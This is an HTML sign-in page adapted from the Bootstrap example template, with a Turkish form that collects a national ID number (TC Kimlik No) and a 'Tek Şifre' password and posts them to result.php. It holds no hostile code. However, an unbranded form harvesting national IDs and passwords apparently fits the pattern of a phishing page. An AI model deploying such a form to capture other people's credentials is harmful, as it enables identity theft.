<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="/docs/4.0/assets/img/favicons/favicon.ico">

    <title>Signin Template for Bootstrap</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/sign-in/">

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
          integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <!-- Custom styles for this template -->
    <link href="assets/css/login.css" rel="stylesheet">

    <!-- hCaptcha -->
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
</head>

<body class="text-center">
<form class="form-signin" action="result.php" method="POST">
    <img class="mb-4" src="./assets/main/img/logo_v2.png" alt="" width="72" height="72">
    <h1 class="h3 mb-3 font-weight-normal">Giriş Yap</h1>
    <label for="inputTC" class="sr-only">TC Kimlik No</label>
    <input type="text" id="inputTC" class="form-control" name="tckno" placeholder="TC Kimlik No" required autofocus>
    <label for="inputPassword" class="sr-only">Tek Şifre</label>
    <input type="password" id="inputPassword" class="form-control" name="password" placeholder="Tek Şifre" required>

    <div class="h-captcha" data-sitekey="3f92fada-862c-41e0-89d8-a8f235a6a9c4"></div>
    <br>

    <div class="checkbox mb-3">
        <label>
            <input type="checkbox" value="remember-me"> Beni Hatırla
        </label>
    </div>
    <button class="btn btn-lg btn-primary btn-block" type="submit">Giriş Yap</button>
    <p class="mt-5 mb-3 text-muted">&copy; 2024</p>
</form>
</body>
</html>
